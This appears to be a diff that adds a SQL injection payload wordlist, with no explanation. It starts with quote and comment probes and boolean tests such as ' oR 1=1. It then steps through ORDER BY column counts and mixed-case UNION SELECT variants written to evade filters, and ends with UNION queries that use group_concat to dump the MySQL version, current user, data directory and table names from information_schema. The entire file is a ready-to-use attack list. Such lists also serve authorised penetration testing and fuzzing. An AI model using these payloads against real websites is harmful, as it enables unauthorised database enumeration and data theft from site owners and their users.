@@ -1,0 +1,45 @@
+'
+"
+1' --+
+&
+||
+#
+--+#
+' --+#
+--
+/**/
+-2
+3-2
++++++++
+' AnD '1'='1
+' ANd '1'='0
+' oR 1=1 --+#
+' oR 1=2 --+#
+ order by 1
+ OrDER by 0
+ OrDER by 1
+ OrDER by 2
+ OrDER by 3
+ OrDER by 4
+ OrDER by 5
+ OrDER by 6
+ OrDER by 7
+ OrDER by 8
+ OrDER by 9
+ OrDER by 10
+ union select 1
+ UniON sELecT 1
+ UniON sELecT 1,2
+ UniON sELecT 1,2,3
+ UniON sELecT 1,2,3,4
+ UniON sELecT 1,2,3,4,5
+ UniON sELecT 1,2,3,4,5,6
+ UniON sELecT 1,2,3,4,5,6,7
+ UniON sELecT 1,2,3,4,5,6,7,8
+ UniON sELecT 1,2,3,4,5,6,7,8,9
+999999 unIoN sELEcT group_concat(@@version,0x3a,database(),0x3a,user(),0x3a,@@datadir),2,3
+999999 unIoN sELEcT 1,group_concat(@@version,0x3a,database(),0x3a,user(),0x3a,@@datadir),3
+999999 unIoN sELEcT 1,2,group_concat(@@version,0x3a,database(),0x3a,user(),0x3a,@@datadir)
+999999 unIoN sELEcT group_concat(table_name),2,3 from information_schema.tables where table_schema=database()
+999999 unIoN sELEcT 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()
+999999 unIoN sELEcT 1,2,group_concat(table_name) from information_schema.tables where table_schema=database()
